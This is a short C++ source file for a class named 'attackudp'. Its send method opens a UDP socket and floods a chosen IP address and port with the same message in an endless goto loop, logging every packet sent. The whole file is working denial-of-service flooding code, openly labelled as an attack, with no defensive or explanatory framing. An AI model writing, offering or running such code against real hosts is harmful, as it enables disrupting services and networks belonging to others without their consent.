#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <memory.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <errno.h>
#include <stdlib.h>
#include <iostream>
#include <cstdlib>
#include <ctime>

class attackudp{
    public:
    void send(std::string ip, std::uint16_t port, std::string msg){
int sock = ::socket(AF_INET, SOCK_DGRAM, 0);

    sockaddr_in destination;
    destination.sin_family = AF_INET;
    destination.sin_port = htons(port);
    destination.sin_addr.s_addr = inet_addr(ip.c_str());
  
loopforever:
    int n_bytes = ::sendto(sock, msg.c_str(), msg.length(), 0, reinterpret_cast<sockaddr*>(&destination), sizeof(destination));
    std::cout << n_bytes << " bytes sent" << " to " << "IP: " << ip << " Port: " << port << std::endl;
    int n_bytes2 = ::sendto(sock, msg.c_str(), msg.length(), 0, reinterpret_cast<sockaddr*>(&destination), sizeof(destination));
    std::cout << n_bytes2 << " bytes sent" << " to " << "IP: " << ip << " Port: " << port << std::endl;
    int n_bytes3 = ::sendto(sock, msg.c_str(), msg.length(), 0, reinterpret_cast<sockaddr*>(&destination), sizeof(destination));
    std::cout << n_bytes3 << " bytes sent" << " to " << "IP: " << ip << " Port: " << port << std::endl;
    int n_bytes4 = ::sendto(sock, msg.c_str(), msg.length(), 0, reinterpret_cast<sockaddr*>(&destination), sizeof(destination));
    std::cout << n_bytes4 << " bytes sent" << " to " << "IP: " << ip << " Port: " << port << std::endl;
    goto loopforever; // some int cannot use with while or for

    }
};